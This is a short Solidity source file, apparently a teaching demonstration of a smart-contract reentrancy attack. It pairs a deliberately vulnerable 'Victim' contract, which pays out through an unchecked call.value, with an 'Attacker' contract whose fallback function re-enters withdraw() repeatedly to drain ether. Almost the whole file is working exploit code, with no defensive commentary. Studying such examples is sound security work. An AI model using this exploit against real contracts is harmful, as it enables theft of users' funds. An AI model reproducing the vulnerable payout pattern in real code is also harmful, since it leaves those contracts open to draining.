pragma solidity ^0.4.8;

contract Victim {

    function withdraw() {
        uint transferAmt= 11;  
        if (!msg.sender.call.value(transferAmt)()) throw; 
    }

    
    function deposit() payable {}
}

contract Attacker {

    Victim v;
    uint public count;

    event LogFallback(uint count, uint balance);

    function Attacker(address victim) {
        v = Victim(victim);
    }

    function attack() {
        v.withdraw();
    }

    function () payable {
        count++;
        LogFallback(count, this.balance);
        
        if(count < 10) v.withdraw();
    }

}
